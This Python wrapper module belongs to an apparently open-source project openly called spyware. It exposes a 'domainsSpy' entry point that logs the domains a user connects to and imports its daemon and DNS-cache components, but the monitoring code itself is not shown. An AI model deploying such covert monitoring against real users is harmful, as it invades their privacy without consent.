#!/usr/bin/env python3
# -*- coding: utf-8 -*-

###################
#    This file implements a SpyWare for connection destinations.
#    Copyright (C) 2021, 2022, 2023  Maurice Lambert

#    This program is free software: you can redistribute it and/or modify
#    it under the terms of the GNU General Public License as published by
#    the Free Software Foundation, either version 3 of the License, or
#    (at your option) any later version.

#    This program is distributed in the hope that it will be useful,
#    but WITHOUT ANY WARRANTY; without even the implied warranty of
#    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
#    GNU General Public License for more details.

#    You should have received a copy of the GNU General Public License
#    along with this program.  If not, see <https://www.gnu.org/licenses/>.
###################

"""
This file implements a SpyWare for connection destinations.

~# python3 DomainsLogger.py domainsSpy.conf

>>> from os import environ
>>> environ['domainsSpy.conf'] = 'domainsSpy.conf'
>>> from SpyWare.DomainsLogger import domainsSpy
>>> domainsSpy()                  # (using env) OR
>>> domainsSpy('domainsSpy.conf') # (using config file name) OR
>>> domainsSpy(argv=["DomainsLogger.py", "domainsSpy.conf"]) # (using argv)
"""

__version__ = "1.0.1"
__author__ = "Maurice Lambert"
__author_email__ = "mauricelambert434@gmail.com"
__maintainer__ = "Maurice Lambert"
__maintainer_email__ = "mauricelambert434@gmail.com"
__description__ = """
This file implements a complete spyware.
"""
license = "GPL-3.0 License"
__url__ = "https://github.com/mauricelambert/SpyWare"

copyright = """
SpyWare  Copyright (C) 2021, 2022, 2023  Maurice Lambert
This program comes with ABSOLUTELY NO WARRANTY.
This is free software, and you are welcome to redistribute it
under certain conditions.
"""
__license__ = license
__copyright__ = copyright

__all__ = ["DomainsLogger", "domainsSpy", "domainsConfig"]

try:
    from .DomainsLogger import (
        Daemon,
        CacheAppData,
        CacheDNS,
        main as domainsSpy,
        config_load as domainsConfig,
    )
except ImportError:
    from DomainsLogger import (
        Daemon,
        CacheAppData,
        CacheDNS,
        main as domainsSpy,
        config_load as domainsConfig,
    )
